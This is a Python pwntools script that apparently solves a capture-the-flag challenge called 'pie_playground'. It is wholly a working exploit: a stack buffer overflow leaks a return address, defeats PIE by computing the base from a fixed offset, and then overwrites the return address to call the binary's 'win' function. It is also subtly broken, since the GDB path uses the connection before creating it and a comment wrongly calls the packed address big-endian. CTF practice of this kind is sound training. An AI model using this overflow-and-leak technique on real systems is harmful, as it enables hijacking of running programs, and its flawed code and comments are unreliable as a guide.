#!/usr/bin/python3

from pwn import *

e = ELF("./pie_playground_patched")

ADDRESS = 'cyberchallenge.diag.uniroma1.it'
PORT = 5054

context.binary = e
context.terminal = ['ptyxis', '-e']
# context.log_level = 'debug'


def conn():
    if args.REMOTE:
        r = remote(ADDRESS, PORT)
    else:
        if args.GDB:
            gdb.attach(r)
        r = process([e.path])

    return r 


def main():
    r = conn()
    
    r.recvuntil(b">")
    # Classic buffer overflow
    payload = b"A"*32 # Out of Bounds
    payload += b"B"*8 # Overwrite the base pointer

    r.send(payload) # Send the payload

    # Leak the return address
    r.recvuntil(b"B"*8) # Recive until the software leak
    leak = r.recvline(keepends=False) # 
    leak = leak.ljust(8, b"\x00") # Justify at left with null bytes until we fill up
    leak = u64(leak) # Unpack the leak to show it in little endian
    log.warn(f"Leak address: {hex(leak)}") # Print the leak  
   
    # Replace fake (pie) address wih real binary offsets
    e.address = leak - 0x134D # Substract real return address to base address
    log.warn(f"Base address: {hex(e.address)}") # Print the base address
   
    # Another buffer overflow (for return read(0,buf,0x50u))
    payload = b"A"*32 # Out of Bounds
    payload += b"B"*8 # Overwrite the base pointer
    payload += p64(e.symbols['win']) # Call win func through big endian address
    r.send(payload)
    
    r.interactive()

if __name__ == "__main__":
    main()
